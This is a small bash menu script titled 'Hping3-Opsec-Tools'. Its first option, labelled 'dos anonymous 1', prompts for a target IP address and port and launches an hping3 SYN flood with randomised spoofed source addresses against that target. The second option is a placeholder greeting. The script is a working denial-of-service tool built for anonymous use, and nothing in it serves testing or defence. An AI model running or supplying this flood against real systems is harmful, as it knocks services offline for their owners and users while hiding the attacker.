#!/bin/bash



menu_option_two() {
  echo "Hello John!!!"
}

menu_option_one() {
  echo -e "─────────────────────────────────────────────────────────────"
  echo "────────────────────Hping3-Opsec-Tools───────────────────────"
  echo "─────────────────────────────────────────────────────────────"
  echo -n "Enter an Ip address: "
  read target
  echo -n "enter port number: "
  read port 
  echo -e "\033[30m─────────────────────────────────────────────────────────────\033[0m "
  echo -e " flooding target \033[5mAnonamoulsy\033[0m"
  echo -e "\033[30m─────────────────────────────────────────────────────────────\033[0m "
  sudo hping3 -S --flood --rand-source -p $port  $target
  echo -e "\033[30m─────────────────────────────────────────────────────────────\033[0m "
}

press_enter() {
  echo ""
  echo -n "	Press Enter to continue "
  read
  clear
}

incorrect_selection() {
  echo "Incorrect selection! Try again."
}

until [ "$selection" = "0" ]; do
  clear
  echo "─────────────────────────────────────────────────────────────"
  echo "────────────────────Hping3-Opsec-Tools───────────────────────"
  echo "─────────────────────────────────────────────────────────────"
  echo "  " 
  echo "    	1  -  dos anonymous 1"
  echo "    	2  -  Menu Option 2"
  echo "    	0  -  Exit"
  echo ""
  echo "───────────────────────────────────────────────────────────── "
  echo -n "  Enter selection: "
  read selection
  case $selection in
    1 ) clear ; menu_option_one ; press_enter ;;
    2 ) clear ; menu_option_two ; press_enter ;;
    0 ) clear ; exit ;;
    * ) clear ; incorrect_selection ; press_enter ;;
  esac
done
